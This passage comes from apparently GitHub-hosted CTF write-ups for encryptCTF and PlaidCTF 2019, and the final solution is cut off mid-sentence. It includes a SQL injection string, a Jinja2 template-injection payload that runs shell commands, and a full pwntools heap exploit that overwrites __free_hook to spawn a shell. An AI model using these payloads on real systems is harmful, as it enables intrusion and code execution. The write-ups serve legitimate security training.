0x392B162C010A021F\n    0x041905001E400302\n    0x1940080C\n    0x1E14\n    0x10\n    -> (concatenate)\n    08030E1F141D192E392B162C010A021F041905001E4003021940080C1E1410\n    -> (pythonise)\n    [0x08, 0x03, 0x0E, 0x1F, 0x14, 0x1D, 0x19, 0x2E, 0x39, 0x2B, 0x16, 0x2C, 0x01, 0x0A, 0x02, 0x1F, 0x04, 0x19, 0x05, 0x00, 0x1E, 0x40, 0x03, 0x02, 0x19, 0x40, 0x08, 0x0C, 0x1E, 0x14, 0x10]\n\n```python\n>>> encFlag = [0x08, 0x03, 0x0E, 0x1F, 0x14, 0x1D, 0x19, 0x2E, 0x39, 0x2B, 0x16, 0x2C, 0x01, 0x0A, 0x02, 0x1F, 0x04, 0x19, 0x05, 0x00, 0x1E, 0x40, 0x03, 0x02, 0x19, 0x40, 0x08, 0x0C, 0x1E, 0x14, 0x10]\n>>> \"\".join([ chr(0x6D ^ x) for x in encFlag ])\n```\n\n`encryptCTF{Algorithms-not-easy}`\n\n## 250 Reversing / crackme03 ##\n\n**Description**\n\n> tik-tok tik-tok can you defuse the bomb?\n> \n> <span style=\"color:#990000;\">```author: codacker```<br></span>\n> <span style=\"color:#990000;\">```nc 104.154.106.182 7777```</span>\n\n**Files provided**\n\n - [`crackme03`](files/crackme03-crackme03)\n\n**Solution**\n\nIn IDA we can find the `main` function as `sub1502`:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int result; // eax\n  signed int i; // [esp+0h] [ebp-68h]\n  int (__cdecl *checkFuncs[5])(char *); // [esp+8h] [ebp-60h]\n  char checkInput[64]; // [esp+1Ch] [ebp-4Ch]\n  unsigned int stackCheck; // [esp+5Ch] [ebp-Ch]\n  int *argc_; // [esp+60h] [ebp-8h]\n\n  argc_ = &argc;\n  stackCheck = __readgsdword(0x14u);\n  checkFuncs[0] = checkFunc1;\n  checkFuncs[1] = checkFunc2;\n  checkFuncs[2] = checkFunc3;\n  checkFuncs[3] = checkFunc4;\n  checkFuncs[4] = checkFunc5;\n  setvbuf(stdout, 0, 2, 0);\n  puts(\"Hi!, i am a BOMB!\\nI will go boom if you don't give me right inputs\");\n  for ( i = 0; i <= 4; ++i )\n  {\n    printf(\"Enter input #%d: \", i);\n    __isoc99_scanf(\"%s\", checkInput);\n    checkFuncs[i](checkInput);\n  }\n  showFlag();\n  result = 0;\n  if ( __readgsdword(0x14u) != stackCheck )\n    terminate();\n  return result;\n}\n```\n\nSo we need to find 5 inputs for the 5 different functions.\n\n```c\nint __cdecl checkFunc1(char *s1)\n{\n  int result; // eax\n\n  result = strcmp(s1, \"CRACKME02\");\n  if ( result )\n    boom();\n  return result;\n}\n```\n\nThe first password is `CRACKME02`.\n\n```c\nint __cdecl checkFunc2(char *a1)\n{\n  int result; // eax\n\n  result = *(_DWORD *)a1;\n  if ( *(_DWORD *)a1 != 0xDEADBEEF )\n    boom();\n  return result;\n}\n```\n\nThe second password needs to be the four bytes `0xEF`, `0xBE`, `0xAD`, `0xDE` (so in little endian they read `0xDEADBEEF`).\n\n```c\nint __cdecl checkFunc3(char *a1)\n{\n  int result; // eax\n  unsigned int v2; // et1\n  size_t i; // [esp+10h] [ebp-28h]\n  char s[4]; // [esp+17h] [ebp-21h]\n  unsigned int v5; // [esp+2Ch] [ebp-Ch]\n\n  v5 = __readgsdword(0x14u);\n  strcpy(s, \"ZXytUb9fl78evgJy3KJN\");\n  for ( i = 0; strlen(s) > i; ++i )\n  {\n    if ( s[i] != a1[i] )\n      boom();\n  }\n  v2 = __readgsdword(0x14u);\n  result = v2 ^ v5;\n  if ( v2 != v5 )\n    terminate();\n  return result;\n}\n```\n\nThe third password is `ZXytUb9fl78evgJy3KJN` (compared one byte at a time).\n\n```c\nint __cdecl checkFunc4(char *s)\n{\n  int v1; // ST1C_4\n\n  if ( strlen(s) > 3 )\n    boom();\n  v1 = atoi(s);\n  if ( v1 * v1 * v1 + 2 * (2 * v1 * v1 - v1) - 3 )\n    boom();\n  return puts(\"SUBSCRIBE TO PEWDIEPIE\");\n}\n```\n\nThe fourth password is a number less than 1000 (string length <= 3) that satisfies the formula `x * x * x + 2 * (2 * x * x - x) - 3 == 0`. We can simply check all the possible numbers with Python, but it turns out the solution, and hence the password, is `1`.\n\n```c\nint __cdecl checkFunc5(char *a1)\n{\n  int result; // eax\n  unsigned int v2; // et1\n  char dest[9]; // [esp+12h] [ebp-16h]\n  unsigned int v4; // [esp+1Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  strncpy(dest, a1, 0xAu);\n  puts(\"Validating Input 4\");\n  if ( dest[0] + dest[8] != 213 )\n    boom();\n  if ( dest[1] + dest[7] != 206 )\n    boom();\n  if ( dest[2] + dest[6] != 231 )\n    boom();\n  if ( dest[3] + dest[5] != 201 )\n    boom();\n  if ( dest[4] == 105 )\n    puts(\"you earned it\");\n  v2 = __readgsdword(0x14u);\n  result = v2 ^ v4;\n  if ( v2 != v4 )\n    terminate();\n  return result;\n}\n```\n\nFinally, we have a 9-character string. The middle character is `i`, the remaining ones need to sum up in pairs to various constants. We can choose `z` as one of the two characters, since there are no other constraints on the string, then find the character to complete the sum:\n\n```python\n>>> [ chr(x - ord('z')) for x in [213, 206, 231, 201] ]\n['[', 'T', 'm', 'O']\n```\n\nSo the password can be `zzzziOmT[`.\n\nWith the five password ready, we can get the flag:\n\n```\n$ printf \"CRACKME02\\n\\xEF\\xBE\\xAD\\xDE\\nZXytUb9fl78evgJy3KJN\\n1\\nzzzziOmT[\\n\" | nc 104.154.106.182 7777\nHi!, i am a BOMB!\nI will go boom if you don't give me right inputs\nEnter input #0: Enter input #1: Enter input #2: Enter input #3: SUBSCRIBE TO PEWDIEPIE\nEnter input #4: Validating Input 4\nyou earned it\n```\n\n`encryptCTF{B0mB_D!ffu53d}`\n\n## 500 Reversing / dontlook at this Challenge ##\n\n**Description**\n\n> 1) this is an easy challenge\n> \n> 2) pls post a writeup if you solve it.\n> \n> Author: @X3eRo0\n\n**Files provided**\n\n - [`a`](files/dontlookatthischallenge-a.out)\n\n**Solution**\n\nPatch the `call ptrace` and `call signal` that are used as anti-debug techniques to `NOPs`, then set breakpoint at `PIE base + 0x1078`, inspect the second argument to read the flag.\n\n## 25 Steganography / yhpargonagets ##\n\n**Description**\n\n> `Find it fi y0u can :p `\n> \n> <span style=\"color:#e83e8c;\"> Author: inc0gnito</span>\n\n**Files provided**\n\n - [`encode`](files/yhpargonagets-encode.jpg)\n\n**Solution**\n\nA hint was released for this challenge since it did not have many solves: `Do you like pip?`\n\n`yhpargonagets` is also steganography backwards.\n\nWe can install the [`steganography`](https://pypi.org/project/steganography/) pip package, then:\n\n```python\n>>> from steganography.steganography import Steganography\n>>> Steganography.decode(\"encode.jpg\")\n```\n\n(The `encode.jpg` file is actually a PNG file.)\n\n`encryptCTF{pip_in5t411_5teg4n0graphy}`\n\n## 50 Steganography / Into The Black ##\n\n**Description**\n\n> \"My My, Hey Hey......,<br>\n> Rock & Roll is here to stay..<br>\n> It's better to burn up,<br>\n> Then to fade away....,<br>\n> My My, Hey Hey.....\"\n> \n> <a href=\"https://imgur.com/a/iC4ORoW\">meme</a>\n> \n> ```Author:@mostwanted002```\n\n**Files provided**\n\n - [`IntoTheBlack`](files/intotheblack-intotheblack.png)\n\n**Solution**\n\nWe can replace the not-quite-black colour with white in our favourite image editor:\n\n![](screens/intotheblack.png)\n\n`encryptCTF{L1GH7_17_UP}`\n\n## 100 Steganography / Stressed out? ##\n\n**Description**\n\n> Elliot all stressed out from this hack, that hack, saving the world (yeeeeep, sounds about right) was losing his mind when Mr. Robot handed him this song to relax to.\n> \n> <span style=\"font-style: italic;color:#b00e8c;\"> Elliot: It's good. So good, it scratched that part of my mind. The part that doesn't allow good to exist without a condition. </span>\n> \n> <span style=\"color:#e83e8c;\"> Author: maskofmydisguise</span>\n\n**Files provided**\n\n - [`dontstressoutkiddo`](files/stressedout-dontstressoutkiddo.zip)\n\n## 50 Web / Sweeeeeet ##\n\n**Description**\n\n> Do you like <a href=\"https://imgur.com/HfJdHKM\">sweets</a>? <br>\n> \n> <span style=\"color:#990000;\">```http://104.154.106.182:8080```</span>\n> \n> ```author: codacker```\n\n**No files provided**\n\n**Solution**\n\nThe title and the description of this challenge refer to cookies.\n\nAfter visiting the website for the first time, we are given a `UID` cookie:\n\n```bash\n$ curl -vv http://104.154.106.182:8080/ 2>&1 | grep \"Set-Cookie\"\n< Set-Cookie: UID=f899139df5e1059396431415e770c6dd; expires=Sat, 06-Apr-2019 14:20:00 GMT; Max-Age=172800\n```\n\nOn our second visit, with the `UID` cookie set, we get another cookie:\n\n```bash\n$ curl -b \"UID=f899139df5e1059396431415e770c6dd\" -vv http://104.154.106.182:8080/ 2>&1 | grep \"Set-Cookie\"\n< Set-Cookie: FLAG=encryptCTF%7By0u_c4nt_U53_m3%7D\n```\n\nBut this is not the flag.\n\nInterestingly though, the `UID` is always the same, even when visiting in different browsers or from different IPs. In fact, the hash is a known hash and it is `md5(\"100\") == \"f899139df5e1059396431415e770c6dd\"`. We can change our `UID` to `md5(\"0\") == \"cfcd208495d565ef66e7dff9f98764da\"`, which gives us the actual flag:\n\n```bash\n$ curl -b \"UID=cfcd208495d565ef66e7dff9f98764da\" -vv http://104.154.106.182:8080/ 2>&1 | grep \"Set-Cookie\"\n< Set-Cookie: FLAG=encryptCTF%7B4lwa4y5_Ch3ck_7h3_c00ki3s%7D%0A\n```\n\n`encryptCTF{4lwa4y5_Ch3ck_7h3_c00ki3s}`\n\n## 50 Web / Slash Slash ##\n\n**Description**\n\n> //\n> \n> ``` Author: maskofmydisguise ```\n\n**Files provided**\n\n - [`handout_slashslash`](files/slashslash-handout_slashslash.7z)\n\n**Solution**\n\nThe `application.py` file gets the flag from the environment variables:\n\n```python\nFLAG = os.getenv(\"FLAG\", \"encryptCTF{}\")\n```\n\nHowever, this is not set by default. If we look into the `env/bin` directory, we see several `activate` scripts (for various shells?). The `activate` script with no extension for `bash` has this line at the end:\n\n    # export $(echo RkxBRwo= | base64 -d)=\"ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg==\"\n\nIf uncommented, it would set the `FLAG` environment variable to:\n\n```bash\n$ base64 -D <<<\"ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg==\"\n```\n\n`encryptCTF{comments_&_indentations_makes_johnny_a_good_programmer}`\n\n## 100 Web / vault ##\n\n**Description**\n\n> i heard you are good at breaking codes, can you crack this vault?\n> \n> <span style=\"color:#990000;\">```http://104.154.106.182:9090```</span>\n> \n> ```author: codacker```\n\n**No files provided**\n\n**Solution**\n\nBasic SQL injection (`' or 1 = 1 -- ` in both fields):\n\n![](screens/vault1.png)\n\nLeads us to an \"ACCESS GRANTED\" page:\n\n![](screens/vault2.png)\n\nBut the QR code is a decoy, it just leads to this [video](https://www.youtube.com/watch?v=gvYfRiJQIX8). The real flag is given to us in the `SESSIONID` cookie: `ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D`.\n\n```bash\n$ base64 -D <<<\"ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0=\"\n```\n\n`encryptCTF{i_H4t3_inJ3c7i0n5}`\n\n## 100 Web / Env ##\n\n**Description**\n\n> <p>Einstein said, \"<i>time</i> was relative, right?\"</p>\n> \n> <a target=\"_blank\" href=\"https://i.imgur.com/LYS3TYi.jpg\">meme 1</a><br>\n> <a target=\"_blank\" href=\"https://i.imgur.com/FcsusMX\">meme 2</a>\n> \n> <span style=\"color:#990000;\">```http://104.154.106.182:6060```</span>\n> \n> ``` Author: maskofmydisguise ```\n> \n\n**No files provided**\n\n## 150 Web / repeaaaaaat ##\n\n**Description**\n\n> Can you repeaaaaaat?\n> \n> <span style=\"color:#990000;\">```http://104.154.106.182:5050```</span>\n> \n> ```author: codacker```\n\n**No files provided**\n\n**Solution**\n\nOn the website we are presented with a script that replicates images whenever we scroll, but we can mostly ignore that. In the sourcecode, we find it says `Hello, (the repeating images)` followed by a comment.\n\nThe comment is always Base-64 encoded and is one of the following:\n\n    L2xvbF9ub19vbmVfd2lsbF9zZWVfd2hhdHNfaGVyZQ==\n    d2hhdF9hcmVfeW91X3NlYXJjaGluZ19mb3IK\n    Lz9zZWNyZXQ9ZmxhZw==\n\nThese decode to:\n\n    /lol_no_one_will_see_whats_here\n    what_are_you_searching_for\n    /?secret=flag\n\nThe first leads to another encoded string `aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2hcP3ZcPVBHakxoT2hNTFhjCg==`, which decodes to the URL of [this video](https://www.youtube.com/watch?v=PGjLhOhMLXc).\n\nThe second is similar, leading to [this video](https://www.youtube.com/watch?v=5rAOyh7YmEc).\n\nBut the final `/?secret=flag` clue is very important. Upon navigating to that URL, we are still on the front page with repeating images, but this time the source reads `Hello, (the repating images) flag`.\n\nHere we can identify a template injection, e.g. when we do `/?secret={{'a'*3}}`, which produces `aaa` in the output. Here is a [useful cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) when dealing with SSTI (server-side template injection). There is no filtering on our input, so we just need to obtain a reference to e.g. the `os` module to do some shell stuff:\n\n    {{\"\".__class__.__mro__[1].__subclasses__()[240].__init__.__globals__[\"sys\"].modules[\"os\"].popen(\"cat%20flag.txt\").read()}}\n\nExplanation:\n\n - `\"\"` - a `str` instance\n - `.__class__` - its type\n - `.__mro__[1]` - its superclass, `object`\n - `.__subclasses__()` - its subclasses\n - `[240]` - (may differ from version to version), one of its subclasses, in this case `zipinfo.ZipFile`\n - `.__init__` - its constructor\n - `.__globals__` - the global variables available to that constructor\n - `[\"sys\"]` - the `sys` module\n - `.modules` - references to other loaded modules\n - `[\"os\"]` - the `os` module\n - `.popen` - the function to run a shell command\n\nSo we run `cat flag.txt` to obtain:\n\n`encryptCTF{!nj3c7!0n5_4r3_b4D}`\n", "timestamp": "2025-10-24T11:39:20.568095"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-04-12-PlaidCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-12-PlaidCTF/README.md", "content": "# 2019-04-12-PlaidCTF #\n\n[CTFTime link](https://ctftime.org/event/743) | [Website](http://plaidctf.com/)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [ ] [600 SPlaid Cypress](#600-crypto--splaidcypress)\n - [ ] [150 R u SAd?](#150-crypto--rusad)\n - [ ] [200 Horst](#200-crypto--horst)\n\n### Misc ###\n\n - [x] [1 Sanity Check](#1-misc--sanitycheck)\n - [x] [250 Everland](#250-misc--everland)\n - [x] [100 can you guess me](#100-misc--canyouguessme)\n - [x] [10 docker](#10-misc--docker)\n - [x] [100 Space Saver](#100-misc--spacesaver)\n - [ ] [333 graffiti](#333-misc--graffiti)\n - [x] [150 A Whaley Good Joke](#150-misc--awhaleygoodjoke)\n - [x] [200 Project Eulernt](#200-misc--projecteulernt)\n\n### Pwnable ###\n\n - [ ] [666 Spectre](#666-pwnable--spectre)\n - [ ] [500 Suffarring](#500-pwnable--suffarring)\n - [x] [300 SPlaid Birch](#300-pwnable--splaidbirch)\n - [ ] [250 Plaid Adventure II](#250-pwnable--plaidadventureii)\n - [x] [150 cppp](#150-pwnable--cppp)\n\n### Reversing ###\n\n - [ ] [500 Plaid Party Planning III 2](#500-reversing--plaidpartyplanningiii2)\n - [x] [500 Plaid Party Planning III](#500-reversing--plaidpartyplanningiii)\n - [ ] [250 big maffs](#250-reversing--bigmaffs)\n - [x] [50 i can count](#50-reversing--icancount)\n - [ ] [250 The .Wat ness](#250-reversing--thewatness)\n\n### Web ###\n\n - [ ] [280 Triggered](#280-web--triggered)\n - [ ] [300 Potent Quotables](#300-web--potentquotables)\n\n---\n\n## 600 Crypto / SPlaid Cypress ##\n\n**Description**\n\n> I came up with this carbon-neutral cryptosystem and hid my secrets in the [forest](files/splaid-cypress_c3a8151251a3bcd2eac5f176112e9db9.zip). Can you help them find their way out?\n\n**Files provided**\n\n - [`splaid-cypress_c3a8151251a3bcd2eac5f176112e9db9`](files/splaidcypress-splaidcypress_c3a8151251a3bcd2eac5f176112e9db9.zip)\n\n## 150 Crypto / R u SAd? ##\n\n**Description**\n\n> Tears dripped from my face as I stood over the bathroom sink. Exposed again! The tears melted into thoughts, and an idea formed in my head. [This](files/rusad_ece608061c4dd2d74b6011a5c7a7f83d.zip) will surely keep my secrets safe, once and for all. I crept back to my computer and began to type.\n\n**Files provided**\n\n - [`rusad_ece608061c4dd2d74b6011a5c7a7f83d`](files/rusad-rusad_ece608061c4dd2d74b6011a5c7a7f83d.zip)\n\n## 200 Crypto / Horst ##\n\n**Description**\n\n> They say 3 rounds is provably secure, right? [Download](files/horst_1413814aa07a564df58dd90f700b2afd.tgz)\n\n**Files provided**\n\n - [`horst_1413814aa07a564df58dd90f700b2afd`](files/horst-horst_1413814aa07a564df58dd90f700b2afd.tgz)\n\n## 1 Misc / Sanity Check ##\n\n**Description**\n\n> Let's make sure things are up and running: flags generally look like <pre>PCTF{welcome to PlaidCTF}</pre> unless we tell you otherwise.\n\n**No files provided**\n\n**Solution**\n\n(TODO)\n\n## 250 Misc / Everland ##\n\n**Description**\n\n> In a darkened land, a hero must fight for their flag! [Source](files/everland_19f72e788727d36b0200b0d9507aeb3f.sml)\n> \n> running at everland.pwni.ng:7772\n\n**Files provided**\n\n - [`everland_19f72e788727d36b0200b0d9507aeb3f`](files/everland-everland_19f72e788727d36b0200b0d9507aeb3f.sml)\n\n**Solution**\n\n(TODO)\n\n## 100 Misc / can you guess me ##\n\n**Description**\n\n> Here's the source to a guessing game: [here](files/can-you-guess-me-53d1aa54ca7d7151fcd2c48ce36d1bdb.py)\n> \n> You can access the server at <pre>nc canyouguessme.pwni.ng 12349</pre>\n\n**Files provided**\n\n - [`can-you-guess-me-53d1aa54ca7d7151fcd2c48ce36d1bdb`](files/canyouguessme-canyouguessme53d1aa54ca7d7151fcd2c48ce36d1bdb.py)\n\n**Solution**\n\n(TODO)\n\n## 10 Misc / docker ##\n\n**Description**\n\n> docker pull whowouldeverguessthis/public\n\n**No files provided**\n\n**Solution**\n\n(TODO)\n\n## 100 Misc / Space Saver ##\n\n**Description**\n\n> we couldn't think of anything cute so [here](files/space_saver-90a5a93dfdda2d0333f573eb3fac9789.dd) you go\n\n**Files provided**\n\n - [`space_saver-90a5a93dfdda2d0333f573eb3fac9789`](files/spacesaver-space_saver90a5a93dfdda2d0333f573eb3fac9789.dd)\n\n**Solution**\n\n(TODO)\n\n## 333 Misc / graffiti ##\n\n**Description**\n\n> [QUAAAAAKE](files/graffiti-0baaf6c57f4f3efbed1e0d57bc02a13a.pcap)\n> <br>\n> In lieu of a description, please watch <a href=\"https://youtu.be/tpxOQzy27x4\" target=\"_blank\">this video</a>. Alternate <a href=\"https://v.youku.com/v_show/id_XNDEzNjczNDQwMA==.html\" target=\"_blank\">link</a>\n\n**Files provided**\n\n - [`graffiti-0baaf6c57f4f3efbed1e0d57bc02a13a`](files/graffiti-graffiti0baaf6c57f4f3efbed1e0d57bc02a13a.pcap)\n\n## 150 Misc / A Whaley Good Joke ##\n\n**Description**\n\n> You'll have a whale of a time with [this one](files/pctf-whales_169aeb74f82dcdceb76e36a6c4c22a89)! I couldn't decide what I wanted the flag to be so I alternated adding and removing stuff in waves until I got something that looked good. Can you dive right in and tell me what was so punny?\n\n**Files provided**\n\n - [`pctf-whales_169aeb74f82dcdceb76e36a6c4c22a89`](files/awhaleygoodjoke-pctfwhales_169aeb74f82dcdceb76e36a6c4c22a89)\n\n**Solution**\n\n(TODO)\n\n## 200 Misc / Project Eulernt ##\n\n**Description**\n\n> Guys, guys, don’t fight. I’m sure we’ll be able to come up with something roughly equal.<br>\n> <a href=\"/files/eulernt_6d26d176de9f441923057d2b5c14f126.py\">source</a><br>\n> eulernt.pwni.ng:5555\n> \n> NOTE: We originally uploaded the wrong version. It is still available here if you really want it: <a href=\"/files/eulernt_deb1006f29e8242a6f0c0d6fac15e32b.py\">wrong version</a>.\n\n**No files provided**\n\n**Solution**\n\n(TODO)\n\n## 666 Pwnable / Spectre ##\n\n**Description**\n\n> Read the <a href=\"http://spectre.pwni.ng:4000\" target=\"_blank\">flag</a>. Don't trust anything.\n> \n> Download the [vm](files/spectre_161f05f267601806bdcd2c499fbf3930). Workers are running Ubuntu 18.04 on GCE with 1 vCPU and 1 GB of memory.\n\n**Files provided**\n\n - [`spectre_161f05f267601806bdcd2c499fbf3930`](files/spectre-spectre_161f05f267601806bdcd2c499fbf3930)\n\n## 500 Pwnable / Suffarring ##\n\n**Description**\n\n> Some days I want to do string manipulation. And I want to do it fast! This guy is optimal up to log factors.<br>\n> [files](files/suffarring_9617710f014cef44de2baac6219ff38d.zip)<br>\n> nc suffarring.pwni.ng 7361\n\n**Files provided**\n\n - [`suffarring_9617710f014cef44de2baac6219ff38d`](files/suffarring-suffarring_9617710f014cef44de2baac6219ff38d.zip)\n\n## 300 Pwnable / SPlaid Birch ##\n\n**Description**\n\n> I make sure never to use <pre>scanf(\"%s\")</pre> when doing competitive programming so that my solutions don't have buffer overflows. But writing algorithms is hard.<br>\n> <a href=\"/files/splaid-birch_c4bb20002c1f46a8a360d3eba748af59.zip\">files</a><br>\n> splaid-birch.pwni.ng:17579\n\n**No files provided**\n\n**Solution**\n\n### Reverse Engineering\n\n`libsplaid.so.1` implements a tree-like data structure, should be binary tree, not sure it is AVL or not. The way to use it is to put the data structure as a field, and access the original data structure by using a negative offset, a common way to implement data structure without template in C.\n\nHowever, the negative offset is annoying, since IDA cannot deal it very well, especially for function `0x555555554D4E`, which is hard to understand without proper decompile. My way to solve this is to copy the assembly out, change all `rdi` to `rdi+0x28` (so the argument becomes the original structure not the pointer to the field), then re-assemble using anything you want (I used `asm` in `pwntools`), and then patch the function using the result. Note that it will not be patched into executable to be executed, it is only patched into IDA database to help the analysis.\n\n```python\n#asm.py, codes is the assembly code copied from IDA\nprint hexlify(asm(codes, arch='amd64'))\n\n#fixoff.py\nfrom binascii import unhexlify\ndef patch_func(func_addr, hexchar):\n\tfunc_end = FindFuncEnd(func_addr)\n\tdata = unhexlify(hexchar)\n\tsize = func_end - func_addr\n\tassert size >= len(data)\n\tfor i in xrange(len(data)):\n\t\tPatchByte(func_addr + i, ord(data[i]))\n```\n\nThere might be better way to patch it such as using `IDAPython` to re-assemble directly, but I did not install `keypatch`.\n\nActually I did not reverse the whole binary even when I solved it, and I still don't know what function `0x555555554D4E` is doing.\n\n### Exploitation\n\nThe vulnerability comes from the OOB of \n\n```c\n__int64 __fastcall select(manager *a1, __int64 a2)\n{\n  data *v2; // rbx\n\n  v2 = a1->buf[a2];                             // oob\n  sp_select(a1, &v2->btent);\n  return v2->var3;\n}\n\n__int64 __fastcall sp_select(manager *a1, btnode *a2)\n{\n  __int64 result; // rax\n\n  result = (__int64)sub_894(a2, a1->some_calc);\n  a1->root = (btnode *)result;\n  return result;\n}\n\nbtnode *__fastcall sub_894(btnode *cur, void (__fastcall *a2)(btnode *))\n{\n  btnode *cur_; // rbx\n  btnode *v3; // rdi\n  btnode *v4; // rax\n\n  cur_ = cur;\n  if ( !cur )\n    return cur_;\n  v3 = cur->parent;\n  if ( !v3 ) //want this to be true, so `cur` will be returned directly\n    return cur_;\n//remaining part is not important\n}\n```\n\nTo exploit it, we can let `select` to choose a pointer that is on the heap, this can either be pointers that should be on the heap, or can be the pointer that we faked on the heap. Then this pointer will be regarded as `data` structure, as shown below\n\n```assembly\n00000000 data            struc ; (sizeof=0x48, align=0x8, mappedto_6)\n00000000 var2            dq ?\n00000008 var3            dq ?\n00000010 num             dq ?\n00000018 sum             dq ?\n00000020 idx             dq ?\n00000028 btent           btnode ?\n00000048 data            ends\n\n00000000 manager         struc ; (sizeof=0x38, align=0x8, mappedto_7)\n00000000 root            dq ?                    ; XREF: main+39/w\n00000008 compare         dq ?                    ; XREF: main+41/w\n00000010 some_calc       dq ?                    ; XREF: main+4A/w\n00000018 sub_555555554D36 dq ?                   ; XREF: main+53/w\n00000020 next_size       dq ?                    ; XREF: main+6E/w\n00000028 cur_size        dq ?                    ; XREF: main+5C/w\n00000030 buf             dq ?                    ; XREF: main+65/w\n00000038 manager         ends\n\n00000000 btnode          struc ; (sizeof=0x20, align=0x8, copyof_10)\n00000000 parent          dq ?                    ; offset\n00000008 lnode           dq ?                    ; offset\n00000010 rnode           dq ?                    ; offset\n00000018 sum2            dq ?\n00000020 btnode          ends\n```\n\nIn order to make it not crash, we don't want this faked structure to get into complicated algorithm, so we want it to return from `sub_894` directly, that is to make `parent == null`, which is to make `[p + 0x28] == nullptr`. Also, since it will print the value of `var3`, we want `[p + 8] == address_we_want_to_leak`.\n\nI think the comments in exploit explain my method well :)\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\n\nif g_local:\n\tsh = process(\"./splaid-birch\", env={'LD_PRELOAD':'./libsplaid.so.1'})\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"splaid-birch.pwni.ng\", 17579)\n\nsendnum = lambda x: sh.sendline(str(x & 0xffffffffffffffff)) \nrecvnum = lambda : int(sh.recvuntil('\\n'), 10)\n\ndef add(v2, v3=0):\n\tsendnum(5)\n\tsendnum(v2)\n\tsendnum(v3)\n\ndef select(idx):\n\tsendnum(4)\n\tsendnum(idx)\n\treturn recvnum()\n\ndef delete(v2):\n\tsendnum(1)\n\tsendnum(v2)\n\n#0. prepare\nadd(3,0)\nadd(-0x28, 1) #used to clear root by producing nullptr(not useful)\nadd(2,0)\n\n#rearrange heap\ndelete(3)\ndelete(2)\ndelete(-0x28)\nadd(3,0)\nadd(-0x28, 1)\nadd(2,0)\n\n#1. leak heap\n#find a pointer in the heap such that\n#\t[p + 0x28] == nullptr\n#\t[p + 8] == heap addr\n#that is pointer to btnode with lnode not null\n# => p == 0x555555758398\nheap_addr = select(0x10a8/8) - 0x1348\nprint hex(heap_addr)\n\nselect(5) # resume the root, idx == 5 is var2 == 2\n\n#2. leak libc\n#construct a pointer in the heap such that\n#\t[p + 0x28] == nullptr\n#\t[p + 8] == libc addr\n\n# use manager.buf to construct unsorted bin\nfor i in xrange(0, 0x90):\n\tadd(4 + i)\ndelete(0x35) # construct [p + 0x28] == nullptr\nfor i in xrange(0x90, 0xa0-5):\n\tadd(4 + i)\n# p == 0x3150\nempty_root2 = heap_addr + 0x57c8\nadd(empty_root2) # used to prevent cycling\nempty_root = heap_addr + 0x5788\nadd(empty_root) # used to prevent cycling\nadd(heap_addr + 0x3100)\nadd(u64(\"/bin/sh\\x00\")) \n#some preparation for shell\n\nhv2 = heap_addr + 0x3150\nadd(hv2)\n\nlibc_addr = select(-7296 / 8) - 0x3ebca0\nprint hex(libc_addr)\n\nselect(0x528/8) # the one with var2 == heap150 is root\n\n#3. get shell\n#delete a root node with parent == nullptr\n#select such that root points to the freed root node\n#free it, cause double free\n#tcache poison to rewrite __free_hook\ndelete(hv2) #delete root\nselect(-7456/8) #reset root to freed root node\ndelete(0) #double free, 0x50 chunk poisoned, var2 == next == nullptr == 0\nselect(-7536/8) #prevent cycle maybe? it will loop forever if we don't have this\n#reset the root to prevent cycling, the fake root must be empty\n\nadd(libc_addr + e.symbols[\"__free_hook\"])\nselect(-7616/8) #reset the root to prevent cycling, the fake root must be empty\nadd(libc_addr + 0x4f322) # consume bin\nadd(libc_addr + e.symbols[\"system\"]) # rewrite here\n\nadd(u64(\"/bin/sh\\x00\")) \ndelete(u64(\"/bin/sh\\x00\"))\n\nsh.interactive()\n```\n\n## 250 Pwnable / Plaid Adventure II ##\n\n**Description**\n\n> Embark on another adventure! Restore from the savefile \"flag.glksave\" on the server to get the flag. (Apologies to Zarf for making a Glulx pwnable.)\n> <pre>\n> stty -icanon -echo\n> nc plaidadventure2.pwni.ng 6910\n> stty sane\n> </pre>\n> <a href=\"/files/Plaid_Adventure_2_36c2f32fe0c0866eeb250b7ac2f48310.ulx\">download</a>\n\n**No files provided**\n\n## 150 Pwnable / cppp ##\n\n**Description**\n\n> C++ is hard.<br>\n> cppp.pwni.ng 4444<br>\n> [binary](files/cppp_58fc210859e4c5e43d051b6476cbc9f7), <a href=\"/files/libc-2.27_50390b2ae8aaa73c47745040f54e602f.so\" target=\"_blank\">libc</a>\n\n**Files provided**\n\n - [`cppp_58fc210859e4c5e43d051b6476cbc9f7`](files/cppp-cppp_58fc210859e4c5e43d051b6476cbc9f7)\n\n**Solution**\n\n### Reverse Engineering\n\nThe C++ is quite hard to reverse, since there are a lot of inline functions. The key is to recognize `std::vector` and `std::basic_string` quickly, which is done by debugging and guessing. Don't try to get into static analysis of STL codes, which is hard and unnecessary to understand.\n\n```c\nstruct string\n{\n  char *p;\n  size_t len;\n  size_t max_len;\n  __int64 field_18;\n};\nstruct kv\n{\n  int buf_size;\n  char *p_buf;\n  string name;\n};\nstruct vector\n{\n  kv *beg;\n  kv *end;\n  kv *max_end;\n};\n```\n\nThe vulnerability comes from deleting a element in the middle. It will not `delete` the element we want to delete but will delete the last element, which causes UAF.\n\n```c\nitem = &data.beg[idx_1];\nif ( data.end != &item[1] )           // element to delete is not last one\n{\n  v22 = (char *)data.end - (char *)(item + 1);\n  next_to_end_len = 0xAAAAAAAAAAAAAAABLL * (v22 >> 4); \n    \t\t\t\t//magic compiler optimization\n    \t\t\t\t// == v22 / 0x30\n  if ( v22 > 0 )\n  {\n    v24 = &item->name;\n  